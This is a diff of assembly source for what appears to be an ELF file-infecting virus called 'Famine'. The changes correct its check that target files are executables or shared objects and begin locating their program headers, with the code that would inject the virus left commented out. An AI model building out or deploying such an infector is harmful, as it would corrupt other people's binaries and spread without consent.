@@ -123,13 +123,12 @@ elf_header:
     cmp dword [rsi], 0x464c457f                             ; 7fELF
     jne next_file
     .exec:
-        cmp dword [rsi + Elf64_Ehdr.e_type], ET_EXEC
-        jne .dyn
-    dyn:
-        cmp dword [rsi + Elf64_Ehdr.e_type], ET_DYN
-        jne next_file
-
-
+        cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
+        je phdr
+    .dyn:
+        cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
+        je phdr
+    jmp next_file
     ; mov ax, word [rsi + Elf64_Ehdr.e_type]               ; We need to check for ET_EXEC or ET_DYN
 %ifdef DEBUG
     mov rsi, [rbp - 16]
@@ -137,6 +136,26 @@ elf_header:
 
     ; movzx rax, word [rsi + Elf64_Ehdr.e_type] 
     dbg [rel(hook.e_type)], rsi
+    dbg [rel(hook.v_size)], FAMINE_SIZE
+%endif
+
+; rsi = e_hdr
+phdr:
+    ; PAGE_ALIGN FAMINE_SIZE
+    mov rdx, rsi
+    add rdx, [rdx  + Elf64_Ehdr.e_phoff]    ; PHDR
+    ; mov [rdx + phdr64]
+    ; PAGE_ALIGN FAMINE_SIZE
+    ; add [rdx + phdr64.p_offset], rcx
+    ; add [rdx + 56 + phdr64.p_offset], rcx
+    ; mov rdi, [rsi + Elf64_Ehdr.e_phoff]
+%ifdef DEBUG
+    push rdx
+    dbg [rel(hook.number)], [rdx + phdr64.p_offset]
+    pop rdx
+    push rdx
+    dbg [rel(hook.number)], [rdx + 56 + phdr64.p_offset]
+    pop rdx
 %endif
 
 next_file:
@@ -175,9 +194,12 @@ hook:
     .target:
         db "Target_file : %s", 0xa, 0
     .e_type:
-        db "e_type : %x", 0xa, 0
+        db "e_type : 0x%x", 0xa, 0
+    .v_size:
+        db "v_size : 0x%x", 0xa, 0
     .string:
         db "%s", 0xa, 0
     .number:
-        db "%x", 0xa, 0
+        db "0x%x", 0xa, 0
 %endif
+_end:
